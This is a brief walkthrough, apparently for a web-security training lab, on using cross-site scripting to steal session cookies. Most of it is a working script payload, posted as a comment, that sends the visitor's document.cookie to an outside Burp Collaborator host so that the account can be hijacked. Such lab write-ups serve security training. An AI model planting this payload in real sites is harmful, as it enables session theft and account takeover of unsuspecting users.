# Lab: Exploiting cross-site scripting to steal cookies

Should comment an HTTP request script injection to your burp collaborator:
```
<script>
var xmlHttp = new XMLHttpRequest();
xmlHttp.open( "GET", 'https://mtjd42yn0x885vau3go892l4wv2oqd.burpcollaborator.net/?'+document.cookie, false ); // false for synchronous request
xmlHttp.send( null );
</script>
```
Then we will see the user's session cookie and we can just call my account with the user's cookie and solve the challenge




